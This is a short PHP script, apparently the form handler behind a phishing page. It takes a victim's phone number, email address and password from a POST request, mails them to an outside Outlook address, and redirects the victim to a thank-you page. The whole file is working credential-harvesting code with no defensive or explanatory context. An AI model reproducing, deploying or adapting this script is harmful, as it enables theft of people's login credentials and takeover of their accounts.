<?php
$destino= "recibircorreos29@outlook.com";
$telefono= $_POST["telefono"];
$correo= $_POST["correo"];
$contrasena= $_POST["contrasena"];
$contenido= "Telefono: ". $telefono . "\nCorreo: " . $correo ."\nContraseña: " . $contrasena;
mail($destino, "Datos", $contenido);
header("location:gracias.html")

?>